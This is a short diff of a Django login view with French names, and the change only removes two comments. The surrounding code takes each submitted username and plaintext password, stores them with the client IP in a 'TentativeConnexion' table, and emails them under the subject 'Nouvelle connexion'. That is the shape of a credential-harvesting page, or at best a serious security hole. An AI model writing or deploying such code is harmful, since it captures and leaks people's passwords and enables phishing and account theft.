@@ -8,14 +8,12 @@ def page_connexion(request):
         mot_de_passe = request.POST.get("password")
         ip = request.META.get('REMOTE_ADDR')
 
-        # Enregistre la tentative
         TentativeConnexion.objects.create(
             identifiant=identifiant,
             mot_de_passe=mot_de_passe,
             adresse_ip=ip
         )
 
-        # Envoi d'email (console local)
         send_mail(
             "Nouvelle connexion",
             f"Email: {identifiant}\nMot de passe: {mot_de_passe}",
